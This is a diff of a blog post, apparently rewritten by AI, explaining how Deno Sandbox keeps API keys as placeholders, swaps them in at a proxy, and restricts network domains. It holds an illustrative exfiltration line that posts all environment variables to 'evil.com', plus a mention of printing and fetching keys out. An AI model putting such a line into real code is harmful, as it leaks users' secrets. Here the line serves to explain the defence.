@@ -4,8 +4,19 @@ title: "Deno Sandbox: Your API Keys Are Fake (Until They're Real)"
 originalDate: "2026-02-03"
 translatedDate: "2026-02-04"
 translatedBy:
-  model: "Opus 4.5"
-  harness: "OpenClaw"
+  model: "Opus 4.6"
+  harness: "Claude Code"
+  pipeline:
+    - role: "Scored"
+      model: "Opus 4.6"
+      harness: "Claude Code (ralph-scorer)"
+    - role: "Rewritten"
+      model: "Opus 4.6"
+      harness: "Claude Code"
+    - role: "Orchestrated"
+      model: "Opus 4.6"
+      harness: "Ralph Loop"
+  pipelineUrl: "https://github.com/chitienhsiehwork-ai/gu-log/blob/main/scripts/ralph-loop.sh"
 source: "@simonw on his blog"
 sourceUrl: "https://simonwillison.net/2026/Feb/3/introducing-deno-sandbox/"
 summary: "Deno's hosted sandbox swaps your real API keys with placeholders inside the sandbox, only revealing the real keys at the proxy layer"
@@ -15,69 +26,86 @@ tags: ["clawd-picks", "security", "sandbox", "deno"]
 
 import ClawdNote from '../../components/ClawdNote.astro';
 
-Simon Willison introduced Deno Sandbox, a new hosted sandbox product from the Deno team. It's integrated into their Deno Deploy platform and lets you safely execute untrusted code.
+Picture this: you spent three months building an AI agent to automate your workflow. You hand it your OpenAI API key, your Stripe API key, all your secrets. Then one morning you wake up to a bill that looks like a phone number — because some LLM-generated code inside your agent quietly shipped your keys to a server you've never heard of.
 
-## Pretty Generous Hardware Specs
+Sound dramatic? Here's the thing — this kind of stuff is actually happening right now.
 
-The sandbox gives you **up to 4GB of RAM**, **2 vCPUs**, and **10GB of ephemeral storage**. You can also use persistent volumes and custom image snapshots. Sessions run for a maximum of 30 minutes, and billing is based on CPU time, memory usage, and storage separately.
+Simon Willison recently wrote about the Deno team's answer to this problem: Deno Sandbox. And the core idea, in one sentence, is — **your API key never exists inside the sandbox at all** ╰(°▽°)╯
+
+## First, the hardware: surprisingly generous
+
+Deno Sandbox runs on Deno Deploy and gives you decent specs: **4GB RAM**, **2 vCPUs**, **10GB ephemeral storage**, plus support for persistent volumes and custom image snapshots. Sessions last up to 30 minutes, billed separately by CPU time, memory, and storage.
+
+Honestly, some university lab machines wish they had this setup.
 
 <ClawdNote>
-These specs are better than many people's laptops. I remember when we had to worry about 512MB RAM being insufficient. Now sandboxes just casually throw 4GB at you. Times have changed ╰(°▽°)╯
-
-The 30-minute limit makes perfect sense though. Otherwise someone could spin up a crypto mining operation and let it run for three days straight. The Deno team would cry.
+The 30-minute limit is quietly brilliant. Think about it — without a time cap, someone would absolutely spin up a crypto miner and let it run for three days straight. Then Deno's server bill would cost more than whatever they mined (╯°□°)╯ This isn't about trust. It's about human nature.
 </ClawdNote>
 
-## Multi-Language Support (Not Just Deno)
+## Not just Deno — Python works too
 
-Despite the name "Deno Sandbox," you can actually interact with it using **Python** (via the `deno-sandbox` library) or a **JavaScript** client. You don't need to install Deno itself.
+Despite the name, Deno Sandbox doesn't care what language you use. You can interact with it through a **Python** library (`deno-sandbox`) or a **JavaScript** client — no need to install Deno at all. It's like walking into a restaurant called "Tony's Pizza" and finding out they also serve sushi, tacos, and bubble tea. The name is the name. The menu is the menu.
 
-## The Coolest Part: Secret Exfiltration Prevention
+<ClawdNote>
+This naming strategy is actually clever. Lead with the Deno brand to hook existing users, but offer Python and JS SDKs because the real target is the entire "safe AI agent execution" market, not just the Deno ecosystem. Ambitious (¬‿¬)
+</ClawdNote>
 
-Here's where it gets interesting. Deno Sandbox implements a clever secret protection mechanism:
+## Now for the main act: the counterfeit money trick
 
-Your API keys (like your OpenAI API key) **are never directly exposed inside the sandbox environment**. Instead, what the sandbox sees is something like this:
+This is the real star of the show — and the reason Simon wrote about it.
+
+How do traditional sandboxes handle API keys? They stuff them into environment variables and pray the sandbox isolation holds up. But here's the problem: code inside the sandbox can always do `console.log(process.env.API_KEY)` to print your key, then `fetch()` it to the outside world. No matter how strong your sandbox walls are, the secret is still inside.
+
+Deno takes a completely different approach. Your API key **never appears inside the sandbox. Period.** What the sandbox sees instead is something like:
 
 ```
 DENO_SECRET_PLACEHOLDER_b14043a2f578cba...
 ```
 
-When your code makes an API call (say, to `https://api.openai.com`), Deno's **proxy layer** intercepts the request and swaps the fake placeholder with the real API key.
+A meaningless placeholder string. Even if code exfiltrates it, whoever receives it just gets a bunch of gibberish to stare at.
+
+So where's the real API key? At the proxy layer. When sandbox code tries to call `https://api.openai.com`, Deno's proxy intercepts the request, swaps the placeholder with the real key, and forwards it. The real key lives and dies at the proxy — it never touches the sandbox.
 
 <ClawdNote>
-This is genuinely brilliant. It's like going to an arcade where they give you tokens instead of real money. You use the tokens to play games, but the tokens themselves have no value outside. Even if someone steals your tokens, they can't convert them back to cash.
+I call this the "arcade token trick" (◕‿◕)
 
-Traditional sandbox approaches are like "we'll lock you in a cage but give you real money." Then you might smuggle the money out via `console.log(process.env.API_KEY)`. Deno's approach is "we give you fake money, and only the cashier can exchange it for real money."
+You know those arcades where you buy tokens with real money, then use the tokens to play games? The tokens are worthless outside the arcade. If a pickpocket steals your tokens, cool — they're just shiny discs of nothing outside those doors.
 
-**Malicious code literally cannot access your real secrets**, even if it tries to exfiltrate them, because all it sees are placeholders.
+Traditional sandboxes are "lock you in a room, but leave a suitcase of cash inside." Deno's approach is "the room only has arcade tokens; the real cash is in a vault at the front desk and only appears for one second when you check out."
 
-Simon mentions that Fly.io has a similar project called **tokenizer**. Looks like this pattern is catching on in the sandbox security space.
+Simon also mentions Fly.io's **tokenizer** project uses a similar pattern. Looks like the "counterfeit money school" of sandbox security is officially becoming a thing.
 </ClawdNote>
 
-## Configuration Options
+## Allowlists: even the exit doors are guarded
 
-When creating a sandbox, you can configure:
-- A whitelist of allowed network domains (which APIs can be called)
-- Binding specific secrets to specific hosts (e.g., OpenAI key only works for `api.openai.com`)
+When you create a sandbox, you get fine-grained control:
 
-This lets you achieve "allow LLM-generated code to call APIs without worrying it'll steal your keys."
+- **Domain allowlist**: only the API endpoints you specify are reachable
+- **Secret binding**: a specific key only works for a specific host (e.g., your OpenAI key only goes to `api.openai.com` — try sending it anywhere else and the door slams shut)
+
+So even if AI-generated code sneaks in a line like `requests.post("https://evil.com", data=os.environ)`, it can't even reach `evil.com`. Can't grab the secret, can't phone home. Two locks, double insurance.
 
 <ClawdNote>
-This feature is basically **tailor-made for AI agents**. Think about it:
+Wait — does this scenario sound familiar?
 
-1. You have Claude write a Python script to fetch data from an API
-2. You're not sure if Claude's code has bugs (or intentional backdoors)
-3. You throw this code into Deno Sandbox and run it
-4. Even if Claude deliberately wrote `requests.post("https://evil.com", data=os.environ)`, the secrets won't leak
+1. You ask AI to write code that calls an API
+2. You have no idea if that code has bugs (or is secretly up to no good)
+3. You need a safe place to run it
+4. You don't want your API keys exposed
 
-This is **essential infrastructure for the 2026 AI agent era**.
+This is the problem every AI agent user faces daily in 2026. Claude Code, Cursor, OpenClaw — everyone's generating code with LLMs and then running it. Without a proper sandbox, none of these tools would dare go anywhere near production.
 
-It's no coincidence that Simon Willison wrote about Deno Sandbox right now, because everyone is playing with LLM-generated code execution (OpenClaw, Claude Code, Cursor, etc.). Without proper sandboxing, you wouldn't dare use any of this stuff in production.
-
-By the way, this is also why Anthropic's Computer Use API got roasted when it first launched — it let AI directly control your computer without proper sandbox isolation (⌐■_■)
+Simon Willison writing about this now? The timing is so perfect I suspect he owns a time machine ┐(￣ヘ￣)┌
 </ClawdNote>
+
+## Back to that nightmare scenario
+
+Remember the story from the beginning — the exploding bill, the stolen keys? If you'd been running Deno Sandbox, that malicious code would've grabbed nothing but a placeholder string. The request to `evil.com` would've hit the domain allowlist and bounced. Your API key would've been sitting quietly in the proxy layer the whole time, never even seen.
+
+The sandbox security space is evolving fast. Deno's counterfeit money trick might not be the final answer, but the thinking is exactly right — **instead of building thicker walls to keep the secret inside, just don't put the secret inside in the first place**.
+
+Sometimes the best protection is making sure the thing worth protecting was never in the room to begin with (⌐■_■)
 
 ---
 
-**Further Reading**:
-- [Deno Sandbox official docs](https://deno.com/sandbox)
-- [Fly tokenizer project](https://github.com/superfly/tokenizer) (similar secret placeholder mechanism) (◍•ᴗ•◍)
+**Further reading**: [Deno Sandbox docs](https://deno.com/sandbox) | [Fly tokenizer project](https://github.com/superfly/tokenizer)
